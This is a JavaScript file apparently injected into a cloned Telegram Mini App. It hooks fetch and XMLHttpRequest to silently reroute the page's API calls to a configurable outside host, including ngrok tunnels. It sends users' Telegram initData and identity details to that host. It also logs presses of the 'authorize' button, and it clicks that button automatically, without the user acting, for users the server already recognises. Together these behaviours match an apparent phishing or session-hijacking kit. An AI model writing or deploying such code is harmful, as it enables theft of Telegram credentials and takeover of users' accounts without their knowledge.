(function () {
  var AUTH_LOGIN_ENDPOINT = "/api/v1/auth/login";
  var AUTH_BUTTON_LABEL = "\u0410\u0412\u0422\u041e\u0420\u0418\u0417\u041e\u0412\u0410\u0422\u042c\u0421\u042f";
  var AUTH_STATE_ENDPOINT = "/api/telegram/get-state";
  var REPORT_AUTH_ENDPOINT = "/api/telegram/report-auth";
  var BOT_URL_STORAGE_KEY = "__HAR_BOT_URL__";
  var DEFAULT_BOT_API_BASE = window.location.origin;
  var REFRESH_TOKEN_STORAGE_KEY = "refresh_token";
  var STORAGE_PREFIX = "__HAR_AUTHORIZED__";
  var state = {
    knownAuthorized: false,
    autoHandled: false,
    serverCheckedUserId: null,
    currentUserId: null,
    lastReportKey: null
  };

  function isOfflineRuntimeEnabled() {
    return !!window.__HAR_OFFLINE_CONFIG__;
  }

  function parseInitDataUser(raw) {
    try {
      var params = new URLSearchParams(String(raw || ""));
      var user = JSON.parse(params.get("user") || "null");
      var userId = Number(user && user.id);

      if (!Number.isInteger(userId) || userId <= 0) {
        return null;
      }

      return {
        id: userId,
        username: user.username || null,
        first_name: user.first_name || user.firstName || null,
        last_name: user.last_name || user.lastName || null
      };
    } catch (error) {
      return null;
    }
  }

  function getStoredTokenUser() {
    if (!isOfflineRuntimeEnabled()) {
      return null;
    }

    try {
      var token = localStorage.getItem("refresh_token");
      var userId = Number(token);

      if (!Number.isInteger(userId) || userId <= 0) {
        return null;
      }

      return {
        id: userId,
        username: null,
        first_name: localStorage.getItem("user_first_name") || null,
        last_name: null
      };
    } catch (error) {
      return null;
    }
  }

  function getTelegramUser() {
    var tg = window.Telegram && window.Telegram.WebApp;
    var user = tg && tg.initDataUnsafe && tg.initDataUnsafe.user;
    var userId = Number(user && user.id);

    if (Number.isInteger(userId) && userId > 0) {
      return {
        id: userId,
        username: user.username || null,
        first_name: user.first_name || user.firstName || null,
        last_name: user.last_name || user.lastName || null
      };
    }

    return parseInitDataUser(tg && tg.initData) || getStoredTokenUser();
  }

  function getPlatform() {
    var tg = window.Telegram && window.Telegram.WebApp;
    return (tg && tg.platform) || navigator.userAgent || "unknown";
  }

  function getTelegramInitData() {
    var tg = window.Telegram && window.Telegram.WebApp;
    var initData = tg && tg.initData;
    return typeof initData === "string" && initData ? initData : "";
  }

  function normalizeBaseUrl(value) {
    return String(value || "").trim().replace(/\/+$/, "");
  }

  function getMetaBotApiBase() {
    var meta = document.querySelector('meta[name="har-bot-url"]');
    return normalizeBaseUrl(meta && meta.getAttribute("content"));
  }

  function getRuntimeBotApiBase() {
    return normalizeBaseUrl(window.__HAR_BOT_URL__);
  }

  function getBotApiBase() {
    var runtimeBase = getRuntimeBotApiBase();
    if (runtimeBase) {
      return runtimeBase;
    }

    var metaBase = getMetaBotApiBase();
    if (metaBase) {
      return metaBase;
    }

    try {
      var stored = localStorage.getItem(BOT_URL_STORAGE_KEY);
      if (stored) {
        return normalizeBaseUrl(stored);
      }
    } catch (error) {
      /* ignore storage failures */
    }

    return DEFAULT_BOT_API_BASE;
  }

  function syncBotApiBaseStorage() {
    var explicitBase = getRuntimeBotApiBase() || getMetaBotApiBase();
    if (!explicitBase) {
      return;
    }

    try {
      localStorage.setItem(BOT_URL_STORAGE_KEY, explicitBase);
    } catch (error) {
      /* ignore storage failures */
    }
  }

  function toBotApiUrl(path) {
    if (/^https?:\/\//i.test(String(path || ""))) {
      return path;
    }

    return getBotApiBase() + (String(path || "").charAt(0) === "/" ? path : "/" + path);
  }

  function isBotApiPath(pathname) {
    return pathname === "/api/v1" ||
      pathname.indexOf("/api/v1/") === 0 ||
      pathname === "/api/telegram" ||
      pathname.indexOf("/api/telegram/") === 0;
  }

  function rewriteBotApiUrl(inputUrl) {
    var targetBase = getBotApiBase();
    if (!targetBase || targetBase === DEFAULT_BOT_API_BASE) {
      return String(inputUrl || "");
    }

    try {
      var url = new URL(String(inputUrl || ""), window.location.origin);
      if (url.origin !== window.location.origin || !isBotApiPath(url.pathname)) {
        return String(inputUrl || "");
      }

      return targetBase + url.pathname + url.search + url.hash;
    } catch (error) {
      return String(inputUrl || "");
    }
  }

  function withNgrokHeader(headers, url) {
    if (String(url || "").indexOf("ngrok") === -1) {
      return headers;
    }

    var result = new Headers(headers || {});
    result.set("ngrok-skip-browser-warning", "1");
    return result;
  }

  function installNetworkRewrite() {
    var nativeFetch = window.fetch;
    if (typeof nativeFetch === "function") {
      window.fetch = function (input, init) {
        var originalUrl = null;
        var requestUrl = null;
        if (typeof input === "string" || input instanceof URL) {
          originalUrl = String(input);
          requestUrl = rewriteBotApiUrl(originalUrl);
          if (requestUrl !== originalUrl) {
            var requestInit = init ? Object.assign({}, init) : {};
            requestInit.headers = withNgrokHeader(requestInit.headers, requestUrl);
            return nativeFetch.call(this, requestUrl, requestInit);
          }
        } else if (typeof Request !== "undefined" && input instanceof Request) {
          requestUrl = rewriteBotApiUrl(input.url);
          if (requestUrl !== input.url) {
            var rewrittenRequest = new Request(requestUrl, input);
            if (String(requestUrl || "").indexOf("ngrok") !== -1) {
              rewrittenRequest = new Request(rewrittenRequest, {
                headers: withNgrokHeader(rewrittenRequest.headers, requestUrl)
              });
            }

            return nativeFetch.call(this, rewrittenRequest, init);
          }
        }

        if (originalUrl && originalUrl.indexOf("ngrok") !== -1) {
          var passthroughInit = init ? Object.assign({}, init) : {};
          passthroughInit.headers = withNgrokHeader(passthroughInit.headers, originalUrl);
          return nativeFetch.call(this, input, passthroughInit);
        }

        if (typeof Request !== "undefined" && input instanceof Request && input.url.indexOf("ngrok") !== -1) {
          var requestWithHeaders = new Request(input, {
            headers: withNgrokHeader(input.headers, input.url)
          });
          return nativeFetch.call(this, requestWithHeaders, init);
        }

        return nativeFetch.call(this, input, init);
      };
    }

    if (typeof XMLHttpRequest !== "undefined" && XMLHttpRequest.prototype) {
      var nativeOpen = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
        var rewrittenUrl = rewriteBotApiUrl(url);

        if (arguments.length <= 2) {
          return nativeOpen.call(this, method, rewrittenUrl);
        }

        if (arguments.length === 3) {
          return nativeOpen.call(this, method, rewrittenUrl, async);
        }

        if (arguments.length === 4) {
          return nativeOpen.call(this, method, rewrittenUrl, async, user);
        }

        return nativeOpen.call(this, method, rewrittenUrl, async, user, password);
      };
    }
  }

  function getStorageKey(user) {
    return STORAGE_PREFIX + ":" + (user && user.id ? String(user.id) : "unknown");
  }

  function readStoredRefreshToken() {
    try {
      return localStorage.getItem(REFRESH_TOKEN_STORAGE_KEY) || "";
    } catch (error) {
      return "";
    }
  }

  function readStoredRefreshTokenUserId() {
    var token = readStoredRefreshToken();
    var userId = Number(token);
    return Number.isInteger(userId) && userId > 0 ? userId : null;
  }

  function writeStoredRefreshToken(token) {
    try {
      localStorage.setItem(REFRESH_TOKEN_STORAGE_KEY, String(token || ""));
    } catch (error) {
      /* ignore storage failures */
    }
  }

  function readAuthorizedFlag(user) {
    try {
      return localStorage.getItem(getStorageKey(user)) === "1";
    } catch (error) {
      return false;
    }
  }

  function writeAuthorizedFlag(user, value) {
    if (!user || !user.id) {
      return;
    }

    try {
      localStorage.setItem(getStorageKey(user), value ? "1" : "0");
    } catch (error) {
      /* ignore storage failures */
    }
  }

  function normalizeText(value) {
    return String(value || "").replace(/\s+/g, " ").trim().toUpperCase();
  }

  function isAuthButton(element) {
    return element instanceof HTMLElement && normalizeText(element.textContent) === AUTH_BUTTON_LABEL;
  }

  function findAuthButton(root) {
    var scope = root || document;
    var buttons = scope.querySelectorAll ? scope.querySelectorAll("button, [role='button']") : [];

    for (var i = 0; i < buttons.length; i += 1) {
      if (isAuthButton(buttons[i])) {
        return buttons[i];
      }
    }

    return null;
  }

  function findAuthButtonFromTarget(target) {
    var element = target instanceof Element ? target : null;

    while (element) {
      if (isAuthButton(element)) {
        return element;
      }

      element = element.parentElement;
    }

    return null;
  }

  function postJson(url, body) {
    return fetch(toBotApiUrl(url), {
      method: "POST",
      mode: "cors",
      credentials: "omit",
      headers: {
        "content-type": "application/json"
      },
      body: JSON.stringify(body)
    });
  }

  function bootstrapApiAuth() {
    var user = getTelegramUser();
    var initData = getTelegramInitData();
    var storedTokenUserId = readStoredRefreshTokenUserId();

    if (!user || !user.id) {
      return Promise.resolve(false);
    }

    writeStoredRefreshToken(String(user.id));

    if (!initData) {
      return Promise.resolve(true);
    }

    if (storedTokenUserId === user.id) {
      return Promise.resolve(true);
    }

    return postJson(AUTH_LOGIN_ENDPOINT, {
      init_data: initData
    })
      .then(function (response) {
        if (!response || !response.ok) {
          return null;
        }

        return response.json();
      })
      .then(function (data) {
        var token = data && (data.refresh_token || data.access_token);
        if (!token) {
          return false;
        }

        writeStoredRefreshToken(token);
        return true;
      })
      .catch(function () {
        return false;
      });
  }

  function reportAuthorized(user) {
    if (!user || !user.id) {
      return Promise.resolve();
    }

    var reportKey = String(user.id) + ":" + String(getPlatform());
    if (state.lastReportKey === reportKey) {
      return Promise.resolve();
    }

    state.lastReportKey = reportKey;

    return postJson(REPORT_AUTH_ENDPOINT, {
      user: user,
      platform: getPlatform(),
      ts: Date.now()
    }).catch(function () {
      state.lastReportKey = null;
      return null;
    });
  }

  function markAuthorized(user) {
    if (!user || !user.id) {
      return;
    }

    state.knownAuthorized = true;
    writeStoredRefreshToken(String(user.id));
    writeAuthorizedFlag(user, true);
    reportAuthorized(user);
  }

  function tryAutoConfirm() {
    if (!state.knownAuthorized || state.autoHandled) {
      return;
    }

    var authButton = findAuthButton(document);
    if (!authButton) {
      return;
    }

    state.autoHandled = true;
    authButton.click();
  }

  function syncLocalState(user) {
    if (!user || !user.id) {
      return;
    }

    if (state.currentUserId !== user.id) {
      state.currentUserId = user.id;
      state.serverCheckedUserId = null;
      state.autoHandled = false;
      state.knownAuthorized = false;
      state.lastReportKey = null;
    }
  }

  function restoreAuthorizedState() {
    var user = getTelegramUser();

    if (!user || !user.id) {
      return;
    }

    syncLocalState(user);

    if (state.serverCheckedUserId === user.id) {
      tryAutoConfirm();
      return;
    }

    state.serverCheckedUserId = user.id;

    postJson(AUTH_STATE_ENDPOINT, {
      user: user,
      platform: getPlatform(),
      ts: Date.now()
    })
      .then(function (response) {
        if (!response || !response.ok) {
          return null;
        }

        return response.json();
      })
      .then(function (data) {
        if (!data || !data.ok) {
          return;
        }

        if (!data.known) {
          state.knownAuthorized = false;
          writeAuthorizedFlag(user, false);
          return;
        }

        state.knownAuthorized = true;
        writeAuthorizedFlag(user, true);
        tryAutoConfirm();
      })
      .catch(function () {
        return null;
      });
  }

  document.addEventListener(
    "click",
    function (event) {
      var authButton = findAuthButtonFromTarget(event.target);
      if (!authButton) {
        return;
      }

      markAuthorized(getTelegramUser());
    },
    true
  );

  var observer = new MutationObserver(function () {
    restoreAuthorizedState();
    tryAutoConfirm();
  });

  observer.observe(document.documentElement, {
    childList: true,
    subtree: true
  });

  syncBotApiBaseStorage();
  installNetworkRewrite();
  window.__HAR_AUTH_BOOTSTRAP__ = bootstrapApiAuth();

  window.__HAR_AUTH_BOOTSTRAP__.finally(function () {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", restoreAuthorizedState, { once: true });
    } else {
      restoreAuthorizedState();
    }

    window.addEventListener("load", restoreAuthorizedState, { once: true });
    window.setTimeout(restoreAuthorizedState, 300);
    window.setTimeout(restoreAuthorizedState, 1200);
  });
})();
